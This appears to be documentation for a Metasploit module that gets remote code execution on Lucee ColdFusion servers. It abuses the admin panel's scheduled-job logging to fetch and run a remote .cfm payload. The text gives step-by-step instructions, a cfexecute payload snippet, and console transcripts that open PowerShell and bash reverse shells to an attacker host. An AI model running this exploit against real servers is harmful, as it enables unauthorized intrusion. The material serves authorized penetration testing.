# Vulnerable Application
Lucee is an Open Source ColdFusion server/engine intended for rapid web development. Many implementations of
ColdFusion files support dynamic input and server side code execution.
In the case of this module, Lucees implementation supports the use of `cfexecute` and `cfscript` tags in `.cfm` files.

In addition to these features, Lucee provides a scheduled job feature. This feature will accept an
external `url` argument and query that page on execution. If logging is enabled, it is possible to
query a remote ColdFusion document, log it in the web root, and access it to execute its code,
subsequently achieving arbitrary server side code execution. The payload will run as the user 
specified during the Lucee installation. On Windows, this is a service account; on Linux, 
it is either the root user or lucee.

The series of requests to achieve this is as follows.

1. Authenticate as the administrator to the web admin panel
2. Create a scheduled job that includes a URL to the remote ColdFusion document
3. Update the scheduled job to turn on logging and ensure that the remote document is logged to the web root
4. Execute the scheduled job. The Lucee server will now reach out to and download the ColdFusion document from the attackers server
5. Access the document at the web root of the server, thus executing the payload.

The basic format for the remote ColdFusion document is as follows.
```html
<cfscript>
            cfexecute(name="powershell.exe", arguments="-c whoami",timeout=5);
</cfscript>
```

The scheduled job feature of Lucee is available in all versions currently available through the vendors website,
available [here](https://download.lucee.org/).As this is default functionality that does not require
any additional setup/configuration, the application is vulnerable immediately upon setup.

## Verification Steps

1. Download and install Lucee from the vendors website. This can be done on either a Windows or Unix host.
   No additional setup is needed beyond the initial installation walkthrough
2. Start MSF Console
3. Do: `use multi/http/lucee_scheduled_job`
4. Choose a target that reflects the target system
	- `use X` (0 for Windows, 1 for Linux)
5. Select payload. This functions with command execution payloads and supports reverse shells and generic commands.
6. Select the desired payload and complete its requirement. `CMD`, `LHOST`, `LPORT`, etc.
7. Select the appropriate `RHOST`, `PASSWORD`, and (if necessary), the `TARGETURI`
8. Execute the payload. You should either receive a shell or see the output of your command.

## Options

### RHOSTS

Remote host to target.

### RPORT

Port being used by the Lucee admin panel. Default is 8888

### PASSWORD

The password of the administrative user. Lucee does not use a username, only a password to access the admin panel.

#### TARGETURI

Target URI of the Lucee administrator panel. Default is

`/lucee/admin/web.cfm/`


`EXECUTE_DELAY`

Periodically, it may take a moment for Lucee to download the entire payload and the scheduled job may try to
execute it before it is available. Adding a brief (default 1 second) delay helps control execution flow for reliable exploitation.

## Scenarios
### Successful exploitation of a Windows 10 host running Lucee 5.3.10.120 for a service account shell
```
msf6 > use exploit/multi/http/lucee_scheduled_job 
[*] Using configured payload cmd/windows/generic
msf6 exploit(multi/http/lucee_scheduled_job) > set payload cmd/windows/powershell_reverse_tcp
payload => cmd/windows/powershell_reverse_tcp
msf6 exploit(multi/http/lucee_scheduled_job) > set RHOSTS 10.0.0.164
RHOSTS => 10.0.0.164
msf6 exploit(multi/http/lucee_scheduled_job) > set LHOST 10.0.0.45
LHOST => 10.0.0.45
msf6 exploit(multi/http/lucee_scheduled_job) > set PASSWORD admin123
PASSWORD => admin123
msf6 exploit(multi/http/lucee_scheduled_job) > run

[*] Started reverse TCP handler on 10.0.0.45:4444 
[+] Authenticated Successfully
[*] Using URL: http://10.0.0.45:8080/isBlgz8g70.cfm
[+] Job isBlgz8g70 created successfully
[+] Job isBlgz8g70 updated successfully
[*] Executing scheduled job: isBlgz8g70
[+] Job isBlgz8g70 executed successfully
[*] 10.0.0.164:8888 - Payload request received: /isBlgz8g70.cfm?RequestTimeout=50
[*] Powershell session session 1 opened (10.0.0.45:4444 -> 10.0.0.164:50288) at 2023-02-17 07:20:28 -0600
[+] Payload isBlgz8g70 executed.
[+] Exploit completed.
[*] Removing scheduled jobisBlgz8g70
[+] Scheduled job removed.
[*] Server stopped.

PS C:\lucee\tomcat> whoami
nt authority\local service

```
### Successful exploitation of a Windows 10 host running Lucee 5.3.10.120 executing whoami
```
msf6 > use exploit/multi/http/lucee_scheduled_job 
[*] Using configured payload cmd/windows/generic
msf6 exploit(multi/http/lucee_scheduled_job) > set PASSWORD admin123
PASSWORD => admin123
msf6 exploit(multi/http/lucee_scheduled_job) > set CMD whoami
CMD => whoami
msf6 exploit(multi/http/lucee_scheduled_job) > set RHOSTS 10.0.0.164
RHOSTS => 10.0.0.164
msf6 exploit(multi/http/lucee_scheduled_job) > run

[+] Authenticated Successfully
[*] Using URL: http://192.168.19.145:8080/59KomN8V.cfm
[+] Job 59KomN8V created successfully
[+] Job 59KomN8V updated successfully
[*] Executing scheduled job: 59KomN8V
[+] Job 59KomN8V executed successfully
[*] 10.0.0.164:8888 - Payload request received: /59KomN8V.cfm?RequestTimeout=50
[+] Payload 59KomN8V executed.
[*] Output: nt authority\local service

[+] Exploit completed.
[*] Removing scheduled job59KomN8V
[+] Scheduled job removed.
[*] Server stopped.
[*] Exploit completed, but no session was created.
```

### Successful exploitation of a Lubuntu host running Lucee 5.1.4.19 for a shell as Lucee
```
msf6 > use exploit/multi/http/lucee_scheduled_job 
[*] Using configured payload cmd/windows/generic
msf6 exploit(multi/http/lucee_scheduled_job) > set target 1
target => 1
msf6 exploit(multi/http/lucee_scheduled_job) > set payload cmd/unix/reverse_bash
payload => cmd/unix/reverse_bash
msf6 exploit(multi/http/lucee_scheduled_job) > set LHOSTS 10.0.0.45
LHOST => 10.0.0.45
msf6 exploit(multi/http/lucee_scheduled_job) > set RHOSTS 10.0.0.33
RHOSTS => 10.0.0.33
msf6 exploit(multi/http/lucee_scheduled_job) > set PASSWORD admin123
PASSWORD => admin123
msf6 exploit(multi/http/lucee_scheduled_job) > run

[*] Started reverse TCP handler on 10.0.0.45:4444 
[+] Authenticated Successfully
[*] Using URL: http://10.0.0.45:8080/l4jMgDxdGFxP.cfm
[+] Job l4jMgDxdGFxP created successfully
[+] Job l4jMgDxdGFxP updated successfully
[*] Executing scheduled job: l4jMgDxdGFxP
[+] Job l4jMgDxdGFxP executed successfully
[*] 10.0.0.33:8888 - Payload request received: /l4jMgDxdGFxP.cfm?RequestTimeout=50
[+] Payload l4jMgDxdGFxP executed.
[+] Exploit completed.
[*] Removing scheduled jobl4jMgDxdGFxP
[+] Scheduled job removed.
[*] Command shell session 1 opened (10.0.0.45:4444 -> 10.0.0.33:45452) at 2023-02-17 07:51:48 -0600
[*] Server stopped.

id
uid=999(lucee) gid=998(lucee) groups=998(lucee)
```
### Successful exploitation of a Lubuntu host running Lucee 5.1.4.19 executing whoami
```
msf6 > use exploit/multi/http/lucee_scheduled_job 
[*] Using configured payload cmd/windows/generic
msf6 exploit(multi/http/lucee_scheduled_job) > set target 1
target => 1
msf6 exploit(multi/http/lucee_scheduled_job) > set payload cmd/unix/generic 
payload => cmd/unix/generic
msf6 exploit(multi/http/lucee_scheduled_job) > set CMD whoami
CMD => whoami
msf6 exploit(multi/http/lucee_scheduled_job) > set RHOSTS 10.0.0.33
RHOSTS => 10.0.0.33
msf6 exploit(multi/http/lucee_scheduled_job) > set PASSWORD admin123
PASSWORD => admin123
msf6 exploit(multi/http/lucee_scheduled_job) > run

[+] Authenticated Successfully
[*] Using URL: http://192.168.19.145:8080/okC09hxj.cfm
[+] Job okC09hxj created successfully
[+] Job okC09hxj updated successfully
[*] Executing scheduled job: okC09hxj
[+] Job okC09hxj executed successfully
[*] 10.0.0.33:8888 - Payload request received: /okC09hxj.cfm?RequestTimeout=50
[+] Payload okC09hxj executed.
[*] Output: lucee

[+] Exploit completed.
[*] Removing scheduled jobokC09hxj
[+] Scheduled job removed.
[*] Server stopped.
[*] Exploit completed, but no session was created.
```
## Caveats
There are a few caveats worth mentioning that are inherent to Lucees implementation of ColdFusion
 - ColdFusion does not reliably execute staged payloads appropriately
 - When a shell command returns multiple lines of output, coldfusion may limit the amount that is returned; i.e. it
   will return the full value of an `ls` command, but it may not return the full value of `netstat`